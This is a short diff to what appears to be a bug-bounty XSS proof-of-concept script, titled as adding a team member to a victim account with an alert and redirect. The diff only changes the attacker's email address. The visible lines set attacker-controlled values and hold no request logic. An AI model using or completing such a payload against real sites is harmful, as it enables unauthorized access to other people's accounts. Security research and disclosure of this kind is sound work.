@@ -1,6 +1,6 @@
 // XSS PoC - Add Team Member with Success Alert & Redirect
 (async function() {
-    const attackerEmail = "naysser+2555@bugcrowdninja.com";
+    const attackerEmail = "naysser+xss@bugcrowdninja.com";
     const firstName = "HackedBy";
     const lastName = "nasserwashere";
     
